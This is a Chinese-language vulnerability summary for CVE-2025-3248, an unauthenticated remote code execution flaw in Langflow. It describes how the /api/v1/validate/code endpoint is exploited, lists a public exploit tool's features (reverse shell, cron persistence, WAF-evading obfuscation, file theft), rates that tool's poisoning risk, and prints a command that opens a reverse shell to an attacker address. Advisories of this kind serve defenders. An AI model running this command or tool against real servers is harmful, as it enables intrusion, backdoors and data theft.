## CVE-2025-3248-Langflow-RCE

**漏洞编号:** CVE-2025-3248

**漏洞类型:** 远程代码执行

**影响应用:** Langflow

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.3.0

**利用条件:** 目标服务器运行Langflow且版本低于1.3.0，网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-3248 是 Langflow 平台中一个未经身份验证的远程代码执行漏洞。该漏洞位于 `/api/v1/validate/code` 端点，允许未经身份验证的攻击者通过发送特制的 HTTP 请求执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。搜索引擎结果显示该漏洞已被积极利用，并且存在利用此漏洞传播 Flodrix 僵尸网络的活动。漏洞利用代码（`exploit.py`）提供了一个完整的攻击框架，支持多种利用模式，包括交互式 shell、单命令执行和反向 shell 连接，这表明该漏洞易于利用。

**投毒风险：**
尽管漏洞利用代码提供了多种功能，但其中一些功能存在潜在的风险。例如，`persist` 命令通过 cron 作业添加持久性后门。虽然这本身不是投毒，但攻击者可以利用此功能在目标系统上建立长期存在的后门。代码中自动payload混淆可以绕过waf，文件上传下载也存在一定的风险，文件上传可以上传恶意文件，文件下载可以窃取敏感文件。此外，该代码使用 `exec` 函数，具有较高的安全风险。

综合来看，投毒风险评估为 10%。 主要是作者在某些功能的设计上存在一定的安全风险。用户需要谨慎使用该工具，以避免潜在的风险。

**利用方式：**
1.  攻击者向 `/api/v1/validate/code` 端点发送包含恶意 Python 代码的 HTTP 请求。
2.  Langflow 在没有充分验证的情况下执行该代码。
3.  攻击者可以在目标系统上执行任意命令，获得系统控制权。

利用代码提供了以下功能：
*   自动漏洞检测。
*   多种利用模式：交互式 shell、单命令执行、反向 shell 连接。
*   文件上传/下载功能。
*   Payload 混淆。
*   HTTPS 绕过。

**利用示例：**
```bash
python exploit.py http://target.com --reverse 192.168.1.100 4444
```
这条命令会在目标系统上启动一个反向 shell，连接到攻击者的 `192.168.1.100:4444`。

**项目地址:** [0-d3y/langflow-rce-exploit](https://github.com/0-d3y/langflow-rce-exploit)

**漏洞详情:** [CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248)